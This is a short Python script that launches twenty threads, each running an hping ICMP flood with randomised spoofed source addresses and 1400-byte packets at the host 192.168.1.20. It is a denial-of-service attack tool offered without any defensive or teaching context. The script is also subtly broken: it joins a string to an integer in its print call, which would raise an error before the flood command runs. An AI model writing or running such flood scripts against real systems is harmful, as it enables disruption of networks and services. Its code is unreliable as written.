import os
from concurrent.futures import ThreadPoolExecutor


def task(i):
    print("Thread " + i + " icmp")
    os.system("hping --icmp --rand-source --flood -d 1400 192.168.1.20")



def main():
    array = []
    for i in range(20):
        array.append(i)
    with ThreadPoolExecutor(20) as t:
        for i in array:
            t.submit(task, i)





if __name__ == "__main__":
    main()